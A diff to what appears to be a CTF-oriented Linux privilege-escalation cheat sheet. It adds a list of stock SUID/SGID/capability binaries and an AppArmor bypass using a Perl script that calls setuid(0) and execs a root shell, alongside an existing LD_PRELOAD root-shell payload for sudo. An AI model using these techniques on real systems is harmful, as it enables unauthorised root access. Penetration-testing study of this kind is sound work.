@@ -1844,8 +1844,47 @@ find / -perm -2000 -type f 2&gt;/dev/null    # SGID
 
 # Capabilities (often missed vs SUID)
 getcap -r / 2&gt;/dev/null
+</code></pre>
+<p><strong>Baseline: what's "normal" to have SUID/SGID/capabilities on a stock Debian/Ubuntu install</strong> — memorize this list so anything <em>not</em> on it immediately jumps out as the likely intended vector, instead of getting lost scrolling past 20+ expected results:</p>
+<pre><code>Expected SUID (usually NOT your target — these ship this way by design)
+├─ /usr/bin/sudo
+├─ /usr/bin/su
+├─ /usr/bin/passwd
+├─ /usr/bin/mount, /usr/bin/umount
+├─ /usr/bin/newgrp
+├─ /usr/bin/gpasswd
+├─ /usr/bin/chsh, /usr/bin/chfn
+├─ /usr/bin/pkexec              (SUID by design — but see PwnKit/CVE-2021-4034
+│                                  coverage under Windows/Linux CVE notes above;
+│                                  worth version-checking even though it's "normal")
+├─ /usr/lib/openssh/ssh-keysign
+├─ /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+├─ /usr/bin/fusermount / fusermount3
+└─ /usr/sbin/pppd                (older/legacy systems only)
 
-# Cron jobs
+Expected SGID (usually NOT your target)
+├─ /usr/bin/wall, /usr/bin/write          (sgid tty)
+├─ /usr/bin/crontab                       (sgid crontab)
+├─ /usr/bin/expiry, /usr/bin/chage        (sgid shadow)
+├─ /sbin/unix_chkpwd                      (sgid shadow)
+└─ /usr/bin/mlocate or /usr/bin/plocate   (sgid mlocate/plocate — reads all
+                                             file paths to build the locate DB)
+
+Expected capabilities (modern distros moved several binaries OFF SUID and
+onto capabilities instead — don't mistake these for something custom)
+├─ /usr/bin/ping                 cap_net_raw+ep
+├─ /usr/bin/traceroute6.iputils  cap_net_raw+ep
+└─ /usr/bin/mtr-packet            cap_net_raw+ep (if mtr is installed)
+
+ANYTHING ELSE showing up in your find/getcap output is worth investigating
+FIRST — a non-standard SUID binary, an SGID binary in an unusual location, or
+a capability like cap_setuid/cap_sys_admin/cap_dac_read_search on something
+that isn't in the lists above is almost always the box's intended path, not
+an accident. Cross-reference every non-baseline hit against GTFOBins
+immediately.
+</code></pre>
+<p>Note the exact baseline shifts slightly between distro versions (and some hardened images strip even more of the "expected" list down) — if you're unsure whether something is stock or added, spinning up a matching fresh install/container image and diffing the output is the definitive check, but the list above covers the overwhelming majority of what you'll see across current Debian/Ubuntu-family CTF boxes.</p>
+<pre><code class="language-bash"># Cron jobs
 cat /etc/crontab; ls -la /etc/cron.*; crontab -l
 find / -writable -path "*cron*" 2&gt;/dev/null
 
@@ -1949,6 +1988,21 @@ void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
 </code></pre>
 <pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o preload.so preload.c
 sudo LD_PRELOAD=/path/preload.so &lt;allowed_binary&gt;
+</code></pre>
+<p><strong>AppArmor confinement bypass via an unconfined interpreter script</strong></p>
+<p>AppArmor profiles are frequently scoped to a specific file path rather than to the interpreter binary itself — so a profile that tightly confines <code>sudo perl /opt/scripts/approved.pl</code> (blocking it from spawning a shell, for example) often does nothing at all to a <em>different</em> Perl script you write yourself in an unconfined location. If you have a sudo rule that lets you run Perl (or any similarly-scoped interpreter) as root, check whether the confinement is actually interpreter-wide or just tied to that one approved script path:</p>
+<pre><code class="language-bash">echo '#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh"' &gt; /tmp/test.pl
+chmod +x /tmp/test.pl
+/tmp/test.pl
+</code></pre>
+<p>Run this through whatever elevated context you already have (e.g. <code>sudo /tmp/test.pl</code>, or however your specific sudo rule/wrapper invokes Perl) rather than as a plain unprivileged user — <code>POSIX::setuid(0)</code> only succeeds if the process already holds root privilege (real/effective UID 0, or <code>CAP_SETUID</code>) to drop into; it will silently fail and just exec a shell as your normal user otherwise. The point of the technique is that your own script at <code>/tmp/test.pl</code> sits outside whatever path the AppArmor profile was written to confine, so once it's running as root via your sudo rule, the <code>exec "/bin/sh"</code> hands you a fully unconfined root shell instead of one still wrapped by the profile's restrictions.</p>
+<pre><code class="language-bash"># confirm the AppArmor profile is actually path-scoped before relying on this
+aa-status 2&gt;/dev/null | grep -i perl
+cat /etc/apparmor.d/*perl* 2&gt;/dev/null
 </code></pre>
 <p><strong>NFS no_root_squash</strong></p>
 <pre><code class="language-bash"># on attacker box, as root, if a share is exported with no_root_squash
